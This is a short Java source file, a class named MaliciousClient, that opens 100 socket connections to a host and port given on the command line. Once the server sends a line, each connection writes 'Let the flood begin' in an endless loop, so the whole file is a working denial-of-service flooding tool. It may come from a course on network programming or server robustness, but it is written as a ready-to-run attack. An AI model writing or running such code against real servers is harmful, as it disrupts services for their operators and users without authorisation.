import java.net.*;
import java.io.*;
import java.util.*;

public class MaliciousClient extends Thread{

  private Socket socket;

  public MaliciousClient(Socket socket){
    this.socket = socket;
  }

  public void run(){
    try{
      while(true){
        handler(socket.getInputStream(), socket.getOutputStream());
      }
    }
    catch(Exception e){}
    finally{
      System.exit(1);
    }
  }

  public void handler(InputStream is, OutputStream os) throws Exception {
    BufferedReader br = new BufferedReader(new InputStreamReader(is));
    PrintWriter pw = new PrintWriter(os, true);
    String line;
    while((line = br.readLine()) != null){
      while(true){
        pw.println("Let the flood begin");
      }
    }
  }

  public static void main(String[] args){
    if(args.length != 2)
      return;
      try {
        Socket socket = new Socket(args[0], Integer.parseInt(args[1]));
        MaliciousClient[] mac = new MaliciousClient[100];
        for(int i = 0; i < mac.length; i++){
          mac[i] = new MaliciousClient(new Socket(args[0], Integer.parseInt(args[1])));
        }
        for(MaliciousClient m : mac)
        m.start();
        while(true);
      }
      catch(Exception e){}
  }

}
